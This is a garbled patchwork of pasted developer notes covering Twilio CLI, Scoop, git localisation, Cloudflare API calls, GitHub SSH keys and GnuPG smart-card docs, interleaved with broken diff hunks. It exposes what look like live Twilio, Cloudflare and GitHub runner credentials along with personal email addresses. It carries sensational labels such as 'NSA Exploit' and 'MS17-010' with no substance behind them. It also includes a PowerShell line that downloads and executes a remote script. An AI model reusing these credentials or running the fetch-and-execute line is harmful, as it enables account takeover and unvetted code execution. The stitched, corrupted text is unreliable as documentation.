It is also possible to pass commands directly to the Docker image for single, contained operations. For example, you can check the running version of the Twilio CLI with the following:

$ docker run -it --rm twilio/twilio-cli twilio --version twilio-cli/3.0.0 linux-x64 node-v14.18.1

$ export TWILIO_ACCOUNT_SID=AC32c8d23aa9b687b5ac871ee3e016f518 $ export TWILIO_API_KEY=SKa6c746877c431ab8185993d610d1d891 $ export TWILIO_API_SECRET=bzNwslKpvbgziV6IEpGYeIOJLnLWvJ7K $ docker run -it --rm
-e TWILIO_ACCOUNT_SID \AC32c8d23aa9b687b5ac871ee3e016f518 -e TWILIO_API_KEY \SKa6c746877c431ab8185993d610d1d891 -e TWILIO_API_SECRET \bzNwslKpvbgziV6IEpGYeIOJLnLWvJ7K twilio/twilio-cli twilio phone-numbers:18886235040

SID

$ docker run -it --rm
-v ~/.twilio-cli:/root/.twilio-cli
twilio/twilio-cli twilio phone-numbers:list

SID Phone Number Friendly Name AC32c8d23aa9b687b5ac871ee3e016f518 +18886235040 (18886235040)

$ docker run -it --rm
-v ~/.twilio-cli:/root/.twilio-cli
twilio/twilio-cli twilio phone-numbers:list

SID Phone Number Friendly Name AC32c8d23aa9b687b5ac871ee3e016f518 +18886235040 (18886235040)

AC32c8d23aa9b687b5ac871ee3e016f518 Account sid cdebfd226c921a938ca472d73d424224

cdebfd226c921a938ca472d73d424224

Auth token

+18886235040 phone number

Org SID gods time travel corporation

ORd50b4acdc2a920bbf44b76a2ab31b127

API key SKa6c746877c431ab8185993d610d1d891

Secret api

Live credentials

AC32c8d23aa9b687b5ac871ee3e016f518

Test credentials

Account SID- used to exercise the REST API AC6e31488a2cc09cb91f378f2a03dd40d4 Test Auth token

9956cd27a83db54b04ec6527603579d6 Keep Primary Auth token 4fb36b6ca3adcce02c96307d8feb6131

brew tap twilio/brew && brew install twilio

scoop bucket known

scoop bucket add extras

scoop bucket add extras https://github.com/lukesampson/scoop-extras.git

scoop bucket add

git clone https://github.com//my-bucket cd my-bucket '{ version: "1.0", url: "https://gist.github.com/lukesampson/6446238/raw/hello.ps1", bin: "hello.ps1" }' > hello.json git add . git commit -m "add hello app" git push

scoop bucket add my-bucket https://github.com//my-bucket

scoop bucket list # -> you should see 'my-bucket' scoop search hello # -> you should see hello listed under, 'my-bucket bucket:' scoop install hello hello # -> you should see 'Hello, !'

scoop install php apache

iex (new-object net.webclient).downloadstring('https://gist.githubusercontent.com/nilkesede/c98a275b80b6d373131df82eaba96c63/raw/apache-php-init.ps1')

httpd

"$(scoop which httpd | split-path)..\conf\httpd.conf"

sudo httpd -k install -n apache sudo net start apache

write an app manifest to hello.json

'{ "version": "1.0", "url": "https://gist.github.com/lukesampson/6446238/raw/hello.ps1", "bin": "hello.ps1" }' > hello.json

install the app

scoop install hello

did it work?

hello # -> should output 'Hello, !'

scoop install \shared\files\scoop\hello.json

scoop install https://gist.github.com/lukesampson/6446567/raw/hello.json make

make install

git format-patch -o output_dir master..foo

git clone https://github.com//git

git remote add gitgitgadget https://github.com/gitgitgadget/git

git fetch gitgitgadget git-gui/master

git checkout -b git-gui/master

mvn clean package

sudo -u postgres psql < sql/createdatabase.sql sudo -u postgres psql biblivre4 < sql/biblivre4.sql

install.packages("remotes")

remotes::install_github("asgr/Rfits")

library(Rfits)

basic example code

file_image=system.file('extdata', 'image.fits', package = "Rfits") temp_image=Rfits_read_image(file_image, header=TRUE) file_table = system.file('extdata', 'table.fits', package = "Rfits") temp_table = Rfits_read_table(file_table, header=TRUE)

data=list(temp_image, temp_table)

file_mix_temp = tempfile()

Rfits_write_all(data, file_mix_temp)

data2 = Rfits_read_all(file_mix_temp)

sum(data[[1]]$imDat - data2[[1]]$imDat) #> [1] 0

cols_check = which(sapply(temp_table[1,], is.numeric)) sum(data[[2]][,..cols_check] - data2[[2]][,..cols_check]) #> [1] 0

rest wavelngth in units of Angstrom

lam_0 = 6563

denisty parameter either 0 or 2 [0 untested]

s = [2]

Number of photons to send out

nPhotons = 1e4

Optical depth (can be list)

tau_range = [5]

Electron temperature from just above formation site to edge of boundary, can be list

Te_range = [(30e3,10e3)]

#unitless radius of scattering region, cal be list R_range = [10]

wind velocity (untested), can be list

vwind = [0] #km/s

Shock velocity in km/s, can be list

vsh = [5500]

python escatter.py

matplotlib==3.8.0 numpy==1.26.2 tqdm==4.66.1

git-gui/ comes from git-gui project, maintained by Pratyush Yadav:
https://github.com/prati0100/git-gui.git

gitk-git/ comes from Paul Mackerras's gitk project:
git://ozlabs.org/~paulus/gitk

make po-init PO_FILE="po/XX.po"

$ git clone https://github.com/git-l10n/git-po-helper.git $ cd git-po-helper $ make $ make test

$ cp git-po-helper /usr/local/bin/

$ git-po-helper -h Helper for git l10n

Usage: git-po-helper [flags] git-po-helper [command]

Available Commands: check Check all ".po" files and commits check-commits Check commits for l10n conventions check-po Check syntax of XX.po file diff Show changes between two l10n files help Help about any command init Create XX.po file team Show team leader/members update Update XX.po file version Display the version of git-po-helper

Flags: -h, --help help for git-po-helper -q, --quiet count quiet mode -v, --verbose count verbose mode -V, --version Show version

Use "git-po-helper [command] --help" for more information about a command. https://github.com/git-l10n/git-po/

+-------------------+ +------------------+ | Git source code | ----(2)---> | L10n coordinator | | repository | <---(5)---- | repository | +-------------------+ +------------------+ | | ^ (1) (3) (4) V v | +----------------------------------+ | Language Team XX | +----------------------------------+

make po/git.pot

make po/git-core.pot

make po-init PO_FILE=po/XX.po

make po-update PO_FILE=po/XX.po

/po/XX.po filter=gettext-no-location

git config --global filter.gettext-no-location.clean
"msgcat --no-location -"

git config --global filter.gettext-no-location.clean
"msgcat --add-location=file -"

make

git-po-helper check-po po/XX.po git-po-helper check-commits

TRANSLATORS: Make sure to include [y], [n], [e], [v] and [a]

in your translation. The program will only accept English

input at this point.

gettext "Apply? [y]es/[n]o/[e]dit/[v]iew patch/[a]ccept all "

/* TRANSLATORS: %s will be "revert" or "cherry-pick" */ die(_("%s: Unable to write new index file"), action_name(opts));

printf(_("HEAD is now at %s"), hex);

printf(Q_("%d commit", "%d commits", number_of_commits));

static const char *reset_type_names[] = { N_("mixed"), N_("soft"), N_("hard"), N_("merge"), N_("keep"), NULL };

die(_("%s reset is not allowed in a bare repository"), _(reset_type_names[reset_type]));

. git-sh-setup . git-sh-i18n

For constant interface messages:

gettext "A message for the user"; echo

To interpolate variables:

details="oh noes" eval_gettext "An error occurred: $details"; echo

For constant interface messages:

gettextln "A message for the user"

To interpolate variables:

details="oh noes" eval_gettextln "An error occurred: $details"

use Git::I18N; print __("Welcome to Git!\n"); printf __("The following error occurred: %s\n"), $error;

git log --reverse -p --grep=i18n git-am.sh

git commit -s

git-po-helper check-po <XX.po>

git-po-helper team --check

$ ls -al ~/.ssh

Lists the files in your .ssh directory, if they exist

$ eval "$(ssh-agent -s)"

Agent pid 59566
$ open ~/.ssh/config

The file /Users/YOU/.ssh/config does not exist.
touch ~/.ssh/config

Host github.com AddKeysToAgent yes UseKeychain yes IdentityFile ~/.ssh/id_ed25519

ssh-add --apple-use-keychain ~/.ssh/id_ed25519

ssh-keygen -t ed25519 -C "6309304695z@gmail.com"

use: ssh-keygen -t rsa -b 4096 -C "6309304695z@gmail.com"

Generating public/private ALGORITHM key pair.
Enter a file in which to save the key (/Users/YOU/.ssh/id_ALGORITHM): [Press enter] At the prompt, type a secure passphrase. For more information, see "Working with SSH key passphrases." Enter passphrase (empty for no passphrase): [Type a passphrase] Enter same passphrase again: [Type passphrase again]
$ eval "$(ssh-agent -s)"

Agent pid 59566
$ open ~/.ssh/config

The file /Users/YOU/.ssh/config does not exist.
touch ~/.ssh/config

Host github.com AddKeysToAgent yes UseKeychain yes IdentityFile ~/.ssh/id_ed25519

ssh-add --apple-use-keychain ~/.ssh/id_ed25519

ssh-keygen -t ed25519-sk -C "6309304695z@gmail.com”

ssh-keygen -t ecdsa-sk -C "6309304695z@gmail. > Enter a file in which to save the key (/Users/YOU/.ssh/id_ed25519_sk): [Press enter] When you are prompted to type a passphrase, press Enter.

Enter passphrase (empty for no passphrase): [Type a passphrase] Enter same passphrase again: [Type passphrase again]

<TOP SECRET/MAJIC/PLUTO File.md> image
  # GitHub CLI api
https://cli.github.com/manual/gh_api

$ RoadRunner ReadMe & $$$ NSA Exploit

'cloudfare id :137607714e07bfa3ae8d9385b95492cb'

curl --request GET
--url https://api.cloudflare.com/client/v4/accounts/account_identifier/billing/profile
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'

curl --request GET
--url https://api.cloudflare.com/client/v4/zones/zone_id/api_gateway/discovery
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'

curl --request GET
--url https://api.cloudflare.com/client/v4/zones/zone_id/api_gateway/discovery/operations
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'

curl --request PATCH
--url https://api.cloudflare.com/client/v4/zones/zone_id/api_gateway/discovery/operations
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'
--data '{ "3818d821-5901-4147-a474-f5f5aec1d54e": { "state": "ignored" }, "b17c8043-99a0-4202-b7d9-8f7cdbee02cd": { "state": "review" } }'

curl --request PATCH
--url https://api.cloudflare.com/client/v4/zones/zone_id/api_gateway/discovery/operations/operation_id
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'
--data '{010203040506070801020304050607080102030405060708}' "state": "review" }'

curl --request GET
--url https://api.cloudflare.com/client/v4/zones/zone_identifier/certificate_authorities/hostname_associations
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'

curl --request PUT
--url https://api.cloudflare.com/client/v4/zones/zone_identifier/certificate_authorities/hostname_associations
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'
--data '{010203040506070801020304050607080102030405060708}' "hostnames": [ "https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator" ], "mtls_certificate_id": "stringstringstringstringstringstring" }'

curl --request PUT
--url https://api.cloudflare.com/client/v4/zones/zone_identifier/certificate_authorities/hostname_associations
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'
--data '{010203040506070801020304050607080102030405060708}' "hostnames": [ "https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator" ], "mtls_certificate_id": "&34798AAFE0A7565088101CC4AE31C5C8C74461CB" }'

curl --request GET
--url https://api.cloudflare.com/client/v4/accounts/account_id/intel/asn/asn/subnets
--header 'Authorization: 2c1spor5BnkzWt0JnGi9udapUV2_5Mr7G95Tv9eLXmApDixbL'
--header 'Content-Type: application/json'

curl --request GET
--url https://api.cloudflare.com/client/v4/accounts/account_id/intel/whois
--header 'Authorization: 2c1spor5BnkzWt0JnGi9udapUV2_5Mr7G95Tv9eLXmApDixbL'
--header 'Content-Type: application/json'

curl --request GET
--url https://api.cloudflare.com/client/v4/zones/zone/spectrum/analytics/events/summary
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'

curl --request GET
--url https://api.cloudflare.com/client/v4/zones/zone/spectrum/analytics/events/summary
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'

curl --request POST
--url https://api.cloudflare.com/client/v4/zones/identifier/ssl/analyze
--header 'Content-Type: application/json'
--header 'X-Auth-Email: god964v@gmail.com'
--data '{010203040506070801020304050607080102030405060708}' "bundle_method": "ubiquitous", "certificate": "-----BEGIN CERTIFICATE-----\nMIIDtTCCAp2gAwIBAgIJAMHAwfXZ5/PWMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV\nBAYTAkFVMRMwEQYDVQQIEwpTb21lLVN0YXRlMSEwHwYDVQQKExhJbnRlcm5ldCBX\naWRnaXRzIFB0eSBMdGQwHhcNMTYwODI0MTY0MzAxWhcNMTYxMTIyMTY0MzAxWjBF\nMQswCQYDVQQGEwJBVTETMBEGA1UECBMKU29tZS1TdGF0ZTEhMB8GA1UEChMYSW50\nZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB\nCgKCAQEAwQHoetcl9+5ikGzV6cMzWtWPJHqXT3wpbEkRU9Yz7lgvddmGdtcGbg/1\nCGZu0jJGkMoppoUo4c3dts3iwqRYmBikUP77wwY2QGmDZw2FvkJCJlKnabIRuGvB\nKwzESIXgKk2016aTP6/dAjEHyo6SeoK8lkIySUvK0fyOVlsiEsCmOpidtnKX/a+5\n0GjB79CJH4ER2lLVZnhePFR/zUOyPxZQQ4naHf7yu/b5jhO0f8fwt+pyFxIXjbEI\ndZliWRkRMtzrHOJIhrmJ2A1J7iOrirbbwillwjjNVUWPf3IJ3M12S9pEewooaeO2\nizNTERcG9HzAacbVRn2Y2SWIyT/18QIDAQABo4GnMIGkMB0GA1UdDgQWBBT/LbE4\n9rWf288N6sJA5BRb6FJIGDB1BgNVHSMEbjBsgBT/LbE49rWf288N6sJA5BRb6FJI\nGKFJpEcwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgTClNvbWUtU3RhdGUxITAfBgNV\nBAoTGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZIIJAMHAwfXZ5/PWMAwGA1UdEwQF\nMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAHHFwl0tH0quUYZYO0dZYt4R7SJ0pCm2\n2satiyzHl4OnXcHDpekAo7/a09c6Lz6AU83cKy/+x3/djYHXWba7HpEu0dR3ugQP\nMlr4zrhd9xKZ0KZKiYmtJH+ak4OM4L3FbT0owUZPyjLSlhMtJVcoRp5CJsjAMBUG\nSvD8RX+T01wzox/Qb+lnnNnOlaWpqu8eoOenybxKp1a9ULzIVvN/LAcc+14vioFq\n2swRWtmocBAs8QR9n4uvbpiYvS8eYueDCWMM4fvFfBhaDZ3N9IbtySh3SpFdQDhw\nYbjM2rxXiyLGxB4Bol7QTv4zHif7Zt89FReT/NBy4rzaskDJY5L6xmY=\n-----END CERTIFICATE-----\n" }'

+WRITECERT +READCERT +WRITEKEY echo common.conf gpg.conf ~/.gnupg/pubring.gpg ~/.gnupg --full-generate-key ¶ --full-gen-key bkuptocard file Restore the given file pubring.kbx keytotpm --sign-key name --lsign-key name --quick-set-primary-uid user-id primary-user-id --detach-sign ¶ -b Make a detached signature.

--encrypt -e ' &34798AAFE0A7565088101CC4AE31C5C8C74461CB' gpg-connect-agent [options] [commands] /usr/local/var/run/gnupg/scdaemon/socket, configuration information is read from /usr/local/etc/gnupg/scdaemon.conf

gpg-connect-agent 'scd getinfo app_list' /bye scdaemon.conf reader_n.status --list-public-keys List the specified keys. If no keys are specified, then all keys from the configured public keyrings are listed.

Never use the output of this command in scripts or other programs. The output is intended only for humans and its format is likely to change. The --with-colons option emits the output in a stable, machine-parseable format, which is intended for use by scripts and other programs.

--list-secret-keys -K

--locate-keys ¶ --locate-external-keys --show-keys PIV).

--card-status

Signs a public key with your secret key but marks it as non-exportable. This is a shortcut version of the subcommand "lsign" from --edit-key.

--quick-sign-key fpr [names] ¶ --quick-lsign-key fpr [names]

~/.gnupg/pubring.kbx The public keyring using the new keybox format. This file is shared with gpgsm. You should backup this file. See above for the relation between this file and it predecessor.

To convert an existing pubring.gpg file to the keybox format, you first backup the ownertrust values, then rename pubring.gpg to publickeys.backup, so it won’t be recognized by any GnuPG versio

$ cd ~/.gnupg $ gpg --export-ownertrust >otrust.lst $ mv pubring.gpg publickeys.backup $ gpg --import-options restore --import publickeys.backup $ gpg --import-ownertrust otrust.lst

~/.gnupg/pubring.kbx.lock The lock file for pubring.kbx.

~/.gnupg/secring.gpg ~/.gnupg/secring.gpg.lock ~/.gnupg/.gpg-v21-migrated File indicating that a migration to GnuPG 2.1 has been done.

~/.gnupg/trustdb.gpg ~/.gnupg/trustdb.gpg.lock

~/.gnupg/random_seed ~/.gnupg/openpgp-revocs.d/

HOME Used to locate the default home directory.

GNUPGHOME If set directory used instead of "~/.gnupg".

GPG_AGENT_INFO This variable is obsolete; it was used by GnuPG versions before 2.1.

PINENTRY_USER_DATA gpgdir/gnupg.nls/langid.mo. Here gpgdir GNUPG_BUILD_ROOT GNUPG_EXEC_DEBUG_FLAGS gpg-connect-agent 'getinfo std_env_names' /bye | awk '$1=="D" { export-ownertrust gpg --export-ownertrust > otrust.txt --import-ownertrust otrust.txt cd ~/.gnupg rm trustdb.gpg gpg --import-ownertrust < otrust.txt --rebuild-keydb-caches

--gen-random 0|1|2|16|30 count

--tofu-policy {auto|good|unknown|bad|ask} keys "648c63bb32eaa48ed50bff8a5000d9f3065359372b82739a992a00ce758bfcd2 actions-runner-osx-x64-2.312.0.tar.gz" | shasum -a 256 -c

./config.sh --url https://github.com/6309304695/sigma-9 --token A4D7THKPGUP3WF5SOJVYMETFXIK2O

runs-on: self-hosted ReadMe.md

+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +gpgsm --with-keygrip -k 6309304695z@gmail.com +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
ReadMe.md | 14 +++++++------- 1 file changed, 7 insertions(+), 7 deletions(-)

diff --git a/ReadMe.md b/ReadMe.md index 9f04e25..eed0212 100644 --- a/ReadMe.md +++ b/ReadMe.md @@ -10,7 +10,7 @@ File.md>

$ RoadRunner ReadMe & $$$ NSA Exploit -+WRITCERT +RESDCERT ++WRITECERT +READCERT +WRITEKEY echo

"648c63bb32eaa48ed50bff8a5000d9f3065359372b82739a992a00ce758bfcd2 actions-runner-osx-x64-2.312.0.tar.gz" | shasum -a 256 -c @@ -574,7 +574,7 @@ Name-Email: otto@example.net algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE

user id ..: otto@example.net
user id ..: 6309304695z@gmail.com +PIV authentication’ key with ssh: + +$ ssh-add -l +384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) + +$ gpgsm --learn +$ gpg --full-gen-key +Please select what kind of key you want:
(1) RSA and RSA (default) @@ -593,11 +593,11 @@ Name-Email: otto@example.net y = key expires in n years +Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y + +GnuPG needs to construct a user ID to identify your key. + +Real name: +Email address: otto@example.net +Comment: +You selected this USER-ID:

-"otto@example.net" +"6309304695z@gmail.com" +Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o +gpg: key C3AFA9ED971BB365 marked as ultimately trusted +gpg: revocation certificate stored as '[...]D971BB365.rev' +public and secret key created and signed. + +Note that this key cannot be used for encryption. You may want to use +the command "--edit-key" to generate a subkey for this purpose. +pub rsa2048 2019-04-04 [SC]

7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 -+uid otto@example.net +$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +Secret key is available. + +sec rsa2048/C3AFA9ED971BB365 ++uid keith bieszczat +$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +Secret key is available. + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 @@ -894,7 +894,7 @@ steps: uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: ${{ 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 }}

passphrase: ${{ 010203040506070801020304050607080102030405060708 }}
passphrase: ${{ 010203040506070801020304050607080102030405060708 }}
name: List keys run: gpg -K @@ -915,7 +915,7 @@ steps: uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: ${{ 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 }}
passphrase: ${{ 010203040506070801020304050607080102030405060708 }}
passphrase: ${{ 010203040506070801020304050607080102030405060708}}
fingerprint: "5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81"
name: List keys @@ -992,7 +992,7 @@ Name-Email: otto@example.net (3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key: (1) sign, encrypt (2) sign -(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used: +(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example "648c63bb32eaa48ed50bff8a5000d9f3065359372b82739a992a00ce758bfcd2 actions-runner-osx-x64-2.312.0.tar.gz" | shasum -a 256 -c
./config.sh --url https://github.com/6309304695/sigma-9 --token A4D7THKPGUP3WF5SOJVYMETFXIK2O

runs-on: self-hosted

+SET KEYS+ & +READ KEYS+ (2). Github Private signing Keys. --header--(1.) 'SHA256:Yg4kSqr/z+BsEtXCeN6bSEsVL4LJnCZjYx6dB4Eoxu8=' --header--(2.) 'SHA256:7iA71iHP1e+aLtJUVQ4cTNtVu1hVdn2Vr94R/jWrsa8='

<gpg/card> writecert PIV.9C < sign.crt +# MS17-010 +# 000006 +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - [verified] - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

keyref .....: PIV.9A (auth) algorithm ..: nistp384 +Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

keyref .....: PIV.9E (auth) algorithm ..: nistp256 +Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Signing key for yk-9074625,O=example,C=DE user id ..: <6309304695z@gmail.co m> +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: 6309304695z@gmail.com PIV authentication’ key with ssh: +$ ssh-add -l +384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) +ssh-add with the uppercase ‘-L +$ gpgsm --learn +$ gpg --full-gen-key +Please select what kind of key you want:

(1) RSA and RSA (default) (2) DSA and Elgamal (3) DSA (sign only) (4) RSA (sign only) (14) Existing key from card +Your selection? (1,2,3,4& 14) all please. +Serial number of the card: FF020001008A77C1 +Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 3 +Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years +Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y + +GnuPG needs to construct a user ID to identify your key. + +Real name: keith bieszczat +Email address: 6309304695z@gmail.com +Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator +You selected this USER-ID: "6309304695z@gmail.com" +SET KEYS + READ KEYS + LEARN+

(2) DSA and Elgamal (3) DSA (sign only) (4) RSA (sign only) -(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys: +(14) Existing key from card +Your selection? (2,3,4 & 14) all please. ++Serial number of the card: FF020001008A77C1 +Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)

READ KEYS+ ---@@ PIV authentication’ key with ssh: (2) DSA and Elgamal (3) DSA (sign only) (4) RSA (sign only) -(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys: +(14) Existing key from card +Your selection? (2,3,4 & 14) all please. ++Serial number of the card: FF020001008A77C1 +Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)

+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o +gpg: key C3AFA9ED971BB365 marked as ultimately trusted +gpg: revocation certificate stored as '[...]D971BB365.rev' +public and secret key created and signed. + +Note that this key cannot be used for encryption. You may want to use +the command "--edit-key" to generate a subkey for this purpose. +pub rsa2048 2019-04-04 [SC]

7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +uid 6309304695z@gmail.com +

run gpg in --expert mode $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +Secret key is available. +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate +[ultimate] (1). otto@example.net +gpg> addkey +Secret parts of primary key are stored on-card. +Please select what kind of key you want:

(3) DSA (sign only) (4) RSA (sign only) (5) Elgamal (encrypt only) (6) RSA (encrypt only) (14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 4 +Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years +Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y +Really create? (y/N) y + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate +ssb rsa2048/7067860A98FCE6E1

created: 2019-04-04 expires: never usage: E card-no: FF020001008A77C1 +[ultimate] (1). otto@example.net + +gpg> save + +/* 32A19-D90712 +LEVEL-5 CLEARANCE ONLY

‘--force’ +authentication key +-header-'010203040506070801020304050607080102030405060708' +SETDATA hexstring +to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command PKSIGN keyid +where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like: PKSIGN --hash=algoname keyid +READKEY hexified_certid +READCERT hexified_certid|keyid +SERIALNO +Return the serial number of the card using a status response like: 'S SERIALNO D27600000000000000000000' +WRITEKEY [--force] keyid +SETDATA hexstring +to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command PKDECRYPT keyid +CHECKPIN idstr +RESTART +APDU [--atr] [--more] [--exlen[=n]] [hexstring] '+S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1' +./configure --sysconfdir=/etc --localstatedir=/va +CN=Wurzel ZS 3,O=Intevation GmbH,C=DE

A6935DD34EF3087973C706FC311AA2CCF733765B S CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE

DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE

!14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S

Key added on: 2011-07-20 20:38:46

Fingerprint: 5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81

34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm +private-keys-v1.d/ +gpg-connect-agent 'help COMMAND' /bye +SETKEY +Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.

PKDECRYPT +The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.

C: PKDECRYPT S: INQUIRE CIPHERTEXT C: D (enc-val elg (a 349324324) C: D (b 3F444677CA))) C: END S: # session key follows S: S PADDING 0 S: S PADDING 0 S: S PADDING 0 S: S PADDING 0 S: D (value 000006004grateful) S: OK decryption successful

Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure: (enc-val ( (<param_name1> ) ... (<param_namen> ))) +Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency. + +If the decryption was successful the decrypted data is returned by means of "D" lines. + +Here is an example session: +

C: PKDECRYPT S: INQUIRE CIPHERTEXT C: D (enc-val elg (a 349324324) C: D (b 3F444677CA))) C: END S: # session key follows S: S PADDING 0 S: D (value 1234567890ABCDEF0) S: OK decryption successful +The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has +SIGKEY +This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay. SETHASH --hash=| +sig-val ( (<param_name1> ) ... (<param_namen> ))) +The operation is affected by the option +Option 1+

OPTION use-cache-for-signing=0|1 +The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching. +Here is an example session: +

